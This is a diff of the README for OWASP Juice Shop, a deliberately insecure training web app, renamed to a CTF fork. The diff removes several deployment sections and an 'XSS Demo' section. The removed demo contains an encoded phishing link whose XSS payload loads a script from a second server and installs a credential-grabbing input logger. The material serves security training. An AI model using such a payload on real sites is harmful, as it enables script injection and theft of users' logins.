@@ -32,51 +32,23 @@ overview please visit the official project page:
 
 ## Setup
 
-### Deploy on Heroku (free ($0/month) dyno)
-
-1. [Sign up to Heroku](https://signup.heroku.com/) and
-   [log in to your account](https://id.heroku.com/login)
-2. Click the button below and follow the instructions
-
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
-
-> This is the quickest way to get a running instance of Juice Shop! If
-> you have forked this repository, the deploy button will automatically
-> pick up your fork for deployment! As long as you do not perform any
-> DDoS attacks you are free to use any tools or scripts to hack your
-> Juice Shop instance on Heroku!
-
 ### From Sources
 
 1. Install [node.js](#nodejs-version-compatibility)
-2. Run `git clone https://github.com/bkimminich/juice-shop.git` (or
-   clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
+2. Run `git clone https://github.com/kimdane/ctf.git` (or
+   clone [your own fork](https://github.com/kimdane/ctf/fork)
    of the repository)
-3. Go into the cloned folder with `cd juice-shop`
+3. Go into the cloned folder with `cd ctf`
 4. Run `npm install` (only has to be done before first start or when you
    change the source code)
 5. Run `npm start`
 6. Browse to <http://localhost:3000>
 
-### Packaged Distributions [![GitHub release](https://img.shields.io/github/downloads/bkimminich/juice-shop/total.svg)](https://github.com/bkimminich/juice-shop/releases/latest) [![SourceForge](https://img.shields.io/sourceforge/dt/juice-shop.svg)](https://sourceforge.net/projects/juice-shop/)
-
-1. Install a 64bit [node.js](#nodejs-version-compatibility) on your
-   Windows (or Linux) machine
-2. Download `juice-shop-<version>_<node-version>_<os>_x64.zip` (or
-   `.tgz`) attached to
-   [latest release](https://github.com/bkimminich/juice-shop/releases/latest)
-3. Unpack and `cd` into the unpacked folder
-4. Run `npm start`
-5. Browse to <http://localhost:3000>
-
-> Each packaged distribution includes some binaries for SQLite bound to
-> the OS and node.js version which `npm install` was executed on.
-
-### Docker Container [![Docker Automated build](https://img.shields.io/docker/automated/bkimminich/juice-shop.svg)](https://registry.hub.docker.com/u/bkimminich/juice-shop/) [![Docker Pulls](https://img.shields.io/docker/pulls/bkimminich/juice-shop.svg)](https://registry.hub.docker.com/u/bkimminich/juice-shop/) ![Docker Stars](https://img.shields.io/docker/stars/bkimminich/juice-shop.svg) [![](https://images.microbadger.com/badges/image/bkimminich/juice-shop.svg)](https://microbadger.com/images/bkimminich/juice-shop "Get your own image badge on microbadger.com") [![](https://images.microbadger.com/badges/version/bkimminich/juice-shop.svg)](https://microbadger.com/images/bkimminich/juice-shop "Get your own version badge on microbadger.com")
+### Docker Container [![Docker Automated build](https://img.shields.io/docker/automated/bkimminich/juice-shop.svg)](https://registry.hub.docker.com/u/kimdane/ctf/) [![Docker Pulls](https://img.shields.io/docker/pulls/bkimminich/juice-shop.svg)](https://registry.hub.docker.com/u/kimdane/ctf/) ![Docker Stars](https://img.shields.io/docker/stars/bkimminich/juice-shop.svg) [![](https://images.microbadger.com/badges/image/bkimminich/juice-shop.svg)](https://microbadger.com/images/bkimminich/juice-shop "Get your own image badge on microbadger.com") [![](https://images.microbadger.com/badges/version/bkimminich/juice-shop.svg)](https://microbadger.com/images/bkimminich/juice-shop "Get your own version badge on microbadger.com")
 
 1. Install [Docker](https://www.docker.com)
-2. Run `docker pull bkimminich/juice-shop`
-3. Run `docker run --rm -p 3000:3000 bkimminich/juice-shop`
+2. Run `docker pull kimdane/ctf`
+3. Run `docker run --rm -p 3000:3000 kimdane/ctf`
 4. Browse to <http://localhost:3000> (on macOS and Windows browse to
    <http://192.168.99.100:3000> if you are using docker-machine instead
    of the native docker installation)
@@ -87,21 +59,12 @@ overview please visit the official project page:
 > `resin/rpi-raspbian` and maintained by
 > [@battletux](https://github.com/battletux).
 
-#### Even easier: Run Docker Container from Docker Toolbox (Kitematic)
-
-1. Install and launch
-   [Docker Toolbox](https://www.docker.com/docker-toolbox)
-2. Search for `juice-shop` and click _Create_ to download image and run
-   container
-3. Click on the _Open_ icon next to _Web Preview_ to browse to OWASP
-   Juice Shop
-
 ### Vagrant
 
 1. Install [Vagrant](https://www.vagrantup.com/downloads.html) and
    [Virtualbox](https://www.virtualbox.org/wiki/Downloads)
-2. Run `git clone https://github.com/bkimminich/juice-shop.git` (or
-   clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
+2. Run `git clone https://github.com/kimdane/ctf.git` (or
+   clone [your own fork](https://github.com/kimdane/ctf/fork)
    of the repository)
 3. Run `cd vagrant && vagrant up`
 4. Browse to [192.168.33.10:3000](http://192.168.33.10:3000)
@@ -114,88 +77,6 @@ overview please visit the official project page:
 > and other vulnerable web applications as well as pentesting tools like
 > [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project).
 
-### Amazon EC2 Instance
-
-1. In the _EC2_ sidenav select _Instances_ and click _Launch Instance_
-2. In _Step 1: Choose an Amazon Machine Image (AMI)_ choose an _Amazon
-   Linux AMI_ or _Amazon Linux 2 AMI_
-3. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
-   copy the script below into _User Data_
-4. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
-   for HTTP
-5. Launch your instance
-6. Browse to your instance's public DNS
-
-```
-#!/bin/bash
-yum update -y
-yum install -y docker
-service docker start
-docker pull bkimminich/juice-shop
-docker run -d -p 80:3000 bkimminich/juice-shop
-```
-
-#### Don't repeat yourself: Define an EC2 Launch Template
-
-1. In the _EC2_ sidenav select _Launch Templates_ and click _Create
-   launch template_
-2. Under _Launch template contents_ select as _AMI ID_ either _Amazon
-   Linux AMI_ or _Amazon Linux 2 AMI_ (by using _Search for AMI_)
-3. In the same section add a _Security Group_ that opens port 80 for
-   HTTP
-4. Unfold _Advanced details_ at the bottom of the screen and paste in
-   the script above into _User Data_
-5. Create your launch template
-6. Launch one or multiple EC2 instances from your template
-7. Browse to your instance's public DNS
-
-> Technically Amazon could view hacking activity on any EC2 instance as
-> an attack on their AWS infrastructure! We highly discourage aggressive
-> scanning or automated brute force attacks! You have been warned!
-
-### Azure Container Instance
-
-1. Open and login (via `az login`) to your
-   [Azure CLI](https://azure.github.io/projects/clis/) **or** login to
-   the [Azure Portal](https://portal.azure.com), open the _CloudShell_
-   and then choose _Bash_ (not PowerShell).
-2. Create a resource group by running `az group create --name <group
-   name> --location <location name, e.g. "centralus">`
-3. Create a new container by running `az container create
-   --resource-group <group name> --name <container name> --image
-   bkimminich/juice-shop --dns-name-label <dns name label> --ports 3000
-   --ip-address public`
-4. Your container will be available at `http://<dns name
-   label>.<location name>.azurecontainer.io:3000`
-
-> For more information please refer to the
-> [detailed walkthrough with screenshots](http://jasonhaley.com/post/Setup-OWASP-Juice-Shop-in-Azure-Container-Instances-%28Part-3-of-3%29)
-> by [@JasonHaley](https://github.com/JasonHaley). You can alternatively
-> follow his guide to
-> [set up OWASP Juice Shop as an Azure Web App for Containers](http://jasonhaley.com/post/Setup-OWASP-Juice-Shop-in-Web-App-for-Containers-%28Part-2-of-3%29).
-
-## Node.js version compatibility
-
-OWASP Juice Shop officially supports the following versions of
-[node.js](http://nodejs.org) in line as close as possible with the
-official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
-images and packaged distributions are offered accordingly:
-
-| node.js  | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
-|:---------|:------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------|
-| 11.x     |                                                                                     | `juice-shop-<version>_node11_windows_x64.zip`, `juice-shop-<version>_node11_linux_x64.tgz` |
-| __10.x__ | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node10_windows_x64.zip`, `juice-shop-<version>_node10_linux_x64.tgz` |
-| 9.x      |                                                                                     | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz`   |
-| 8.x      |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz`   |
-
-## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)
-
-Feel free to have a look at the latest version of OWASP Juice Shop:
-<http://demo.owasp-juice.shop>
-
-> This is a deployment-test and sneak-peek instance only! You are __not
-> supposed__ to use this instance for your own hacking endeavours! No
-> guaranteed uptime! Guaranteed stern looks if you break it!
 
 ## Customization
 
@@ -216,23 +97,6 @@ tool.
 For step-by-step instructions and examples please refer to
 [the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
 of our companion guide ebook.
-
-## XSS Demo
-
-To show the possible impact of
-[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
-can download this
-[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
-and run `docker-compose up` to start the juice-shop and the
-shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
-and login. Apart from the visual/audible effect, the attacker also
-installed [an input logger](http://localhost:8080/logger.php) to grab
-credentials! This could easily run on a 3rd party server in real life!
-
-> We recommend to use Mozilla Firefox for this demo! You can also find a
-> recording of this attack in action on YouTube:
-> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
 
 
 ## Additional Documentation
